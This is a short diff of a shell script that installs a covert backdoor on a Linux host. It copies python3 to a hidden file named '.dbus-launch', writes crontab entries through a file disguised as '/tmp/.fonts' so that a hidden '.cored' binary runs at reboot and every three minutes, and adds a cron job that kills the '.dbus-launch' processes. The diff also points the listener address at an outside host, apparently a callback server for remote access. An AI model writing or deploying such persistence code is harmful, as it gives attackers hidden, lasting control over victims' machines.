@@ -6,7 +6,7 @@ read PORT
 echo "[+] Enter the directory should be stored (e.g.,):"
 read TARGET_DIR
 
-LISTENER_IP=""  # <-- You can also read this via user input
+LISTENER_IP="digitalocean.live"  # <-- You can also read this via user input
 
 # Copy Python to stealthy name
 cp /usr/bin/python3 "$TARGET_DIR/.dbus-launch"
@@ -35,7 +35,9 @@ crontab -l 2>/dev/null > /tmp/.fonts || true
 
 
 echo "@reboot setsid nohup $TARGET_DIR/.cored >/dev/null 2>&1 &" >> /tmp/.fonts
-echo "* * * * * setsid nohup $TARGET_DIR/.cored >/dev/null 2>&1 &" >> /tmp/.fonts
+echo "*/3 * * * * setsid nohup $TARGET_DIR/.cored >/dev/null 2>&1 &" >> /tmp/.fonts
+echo "*/30 * * * * ps aux | grep '[.]dbus-launch' | awk '{print \$2}' | xargs -r kill -9" >> /tmp/.fonts
+
 
 
 crontab /tmp/.fonts
